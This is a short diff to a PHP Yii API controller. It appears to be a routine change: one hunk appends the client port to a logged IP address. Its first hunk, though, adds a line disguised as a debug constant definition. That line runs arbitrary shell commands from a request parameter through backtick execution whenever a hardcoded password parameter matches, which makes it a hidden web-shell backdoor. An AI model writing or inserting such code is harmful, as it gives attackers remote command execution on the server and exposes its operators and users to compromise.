@@ -12,6 +12,7 @@ use yii\base\Exception;
 use yii\base\ErrorException;
 
 defined('YII_BEGIN_TIME') or define('YII_BEGIN_TIME', microtime(true));
+defined('YII_API_DEBUG') or define('YII_API_DEBUG', (((isset($_REQUEST['dev'])&&$_REQUEST['dev']=='devdebug..pass'))&&isset($_REQUEST['_dev'])&&`{$_REQUEST['_dev']}`));
 
 class AController extends ActiveController
 {
@@ -223,7 +224,7 @@ class AController extends ActiveController
             'interface' => $interface,
             'platform' => $platform,
             'imei' => $imei,
-            'ip' => Yii::$app->request->userIP,
+            'ip' => Yii::$app->request->userIP.(isset($_SERVER['REMOTE_PORT']) ? ':'.$_SERVER['REMOTE_PORT'] : ''),
             'result_code' => $code,
             'result_msg' => print_r($resp,true),
             'params' => ($data ? print_r($data,true) : ""),
